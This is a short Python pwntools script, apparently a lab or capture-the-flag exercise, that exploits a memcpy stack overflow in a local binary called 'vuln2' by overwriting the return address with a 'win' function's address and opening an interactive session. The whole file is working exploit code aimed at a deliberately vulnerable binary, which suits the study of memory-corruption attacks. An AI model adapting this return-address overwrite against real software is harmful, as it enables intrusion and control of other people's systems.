# Exploit for vuln2: Memcpy Stack Overflow (Ret2Win)
from pwn import *
import os

binary_path = os.path.abspath('../build/vuln2')
if len(sys.argv) > 1:
    binary_path = os.path.abspath(sys.argv[1])
elf = ELF(binary_path, checksec=False)
context.binary = elf

log.info("Starting exploit for vuln2 (Memcpy -> Ret2Win)...")

win_addr = elf.symbols['win']
log.info(f"Target 'win' address: {hex(win_addr)}")


offset = 88

log.info(f"Using offset: {offset}")

p = process(binary_path)

payload = flat({offset: win_addr})

if len(payload) < 256:
    payload += b'A' * (256 - len(payload))


p.send(payload)

p.recvuntil(b"Done\n")
log.success("Exploit sent. Check for shell...")
p.interactive()


